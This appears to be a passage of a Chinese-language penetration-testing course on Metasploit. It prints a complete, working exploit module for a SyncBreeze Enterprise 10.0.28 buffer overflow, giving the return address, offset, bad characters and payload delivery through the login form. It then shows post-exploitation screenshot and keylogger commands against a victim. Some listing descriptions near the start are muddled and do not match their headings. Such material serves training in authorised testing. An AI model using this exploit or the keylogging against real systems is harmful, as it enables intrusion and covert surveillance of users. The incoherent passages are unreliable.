## Meterpreter 会话管理

到此为止，我们已经使用各种内置命令在 Meterpreter 会话中导航，但我们也可以临时退出 Meterpreter shell 以在 Metasploit Framework 中执行其他操作，而不关闭连接。我们可以使用 `background` 命令返回 `msfconsole` 提示符，在其中可以在框架内执行其他操作。

### 列表 784 - 配置 Handler 模块自动枚举登录用户

当我们准备好时，可以在 Meterpreter 连接时配置 handler 模块来自动列出已登录用户。

### 列表 785 - 会话切换与有效负载

在 Meterpreter 期间，我们可以使用不同的有效负载来切换。在客户端攻击期间，因为当用户执行我们的有效负载时，我们可能不在现场，这意味着会话可能会空闲或丢失。例如，我们可以配置 `windows/gather/enum_logged_on_users` 模块来自动列出已登录用户。

### 列表 786 - 传输层切换

在利用新的传输层之前，我们必须设置。通过选择 handler 模块并指定传输层，这将创建一个新的会话并关闭旧会话。

### Check 函数实现

**列表 791 - 模块的 check 函数**

通过对 URL `/` 发送 HTTP GET 请求完成。在存在漏洞的系统上，结果包含文本 "Sync Breeze Enterprise v10.0.28"。

```ruby
def check
  res = send_request_cgi('uri' => '/', 'method' => 'GET')

  if res && res.code == 200
    product_name = res.body.scan(/Sync Breeze Enterprise v[^\n]*/).flatten.first
    if product_name =~ /10\.0\.28/
      return Exploit::CheckCode::Appears
    end
  end

  return Exploit::CheckCode::Safe 
end
```

### Exploit 函数实现

**列表 792 - Metasploit 模块的 exploit 函数**

最后部分是漏洞利用本身。首先，我们将创建漏洞字符串，该字符串使用偏移量和 `JMP ESP` 指令的内存地址，配合 NOP 滑块和有效负载。然后，我们将使用 `/login` URL 作为原始漏洞，通过 HTTP POST 请求发送构造的恶意字符串。我们将用以下字符串填充 HTTP POST `username` 变量：

```ruby
def exploit
  print_status("Generating exploit...")
  exp = rand_text_alpha(target['Offset'])
  exp << [target.ret].pack('V')
  exp << make_nops(10) # NOP sled to make sure we land on jump
  exp << payload.encoded

  print_status("Sending exploit...")

  send_request_cgi(
    'uri' => '/login',
    'method' => 'POST',
    'connection' => 'keep-alive',
    'vars_post' => {
      'username' => "#{exp}",
      'password' => "fakepw"
    }
  )

  handler
  disconnect
end
```

### 完整模块代码

**列表 793 - 完成 Metasploit 模块**

将所有部分组合在一起，我们得到了一个针对 SyncBreeze 漏洞的完整 Metasploit 漏洞模块：

```ruby
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SyncBreeze Enterprise Buffer Overflow',
      'Description'    => %q(
        This module ports your python exploit of SyncBreeze Enterprise 10.0.28 to MSF.
      ),
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Offensive Security', 'offsec' ],
      'References'     =>
        [
          ['EDB', '42886']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d",
          'Space'    => 500
        },
      'Targets'        =>
        [
          [
            'SyncBreeze Enterprise 10.0.28',
            {
              'Ret'    => 0x10090c83, # JMP ESP -- libssf.dll
              'Offset' => 780
            }
          ]
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2017-03-29'
    ))

    register_options(
      [
        Opt::RPORT(80)
      ]
    )
  end

  def check
    res = send_request_cgi('uri' => '/', 'method' => 'GET')

    if res && res.code == 200
      product_name = res.body.scan(/Sync Breeze Enterprise v[^\n]*/).flatten.first
      if product_name && product_name =~ /10\.0\.28/
        return Exploit::CheckCode::Appears
      end
    end

    return Exploit::CheckCode::Safe 
  end

  def exploit
    print_status("Generating exploit...")
    exp = rand_text_alpha(target['Offset'])
    exp << [target.ret].pack('V')
    exp << make_nops(10) # NOP sled to make sure we land on jump
    exp << payload.encoded

    print_status("Sending exploit...")

    send_request_cgi(
      'uri' => '/login',
      'method' => 'POST',
      'connection' => 'keep-alive',
      'vars_post' => {
        'username' => "#{exp}",
        'password' => "fakepw"
      }
    )

    handler
    disconnect
  end
end
```

# 22.5 使用 Metasploit 进行后利用

一旦进入目标，我们可以进入后利用阶段，在该阶段收集信息、采取步骤维持访问、跳转到其他机器等。

Metasploit Framework 具有许多后利用功能和模块，可以简化后利用过程的许多方面。除了内置的 Meterpreter 命令，还编写了许多后利用 MSF 模块，以活动会话作为参数。

让我们仔细观察其中的一些后利用功能。

## 22.5.1 核心后利用功能

正如我们之前看到的，我们可以遍历文件系统，并列出受害主机上的操作系统、用户信息以及正在运行的进程。我们还可以直接从 Meterpreter 命令行提示符上传和下载文件。

Meterpreter 还提供了其他额外的基础后利用功能，包括通过 `screenshot` 命令对受害桌面进行截图的选项。

**列表 797 - 对受害主机桌面进行截图**

```bash
meterpreter > screenshot
Screenshot saved to: /root/.msf4/loot/beVjSnB.jpeg
meterpreter >
```

这种能力允许我们捕捉敏感的用户操作图片，而这些操作平时可能很难发现。Meterpreter 还允许我们通过 `keyscan_start`、`keyscan_dump` 和 `keyscan_stop` 启动键盘记录器并检测活动用户的按键输入。
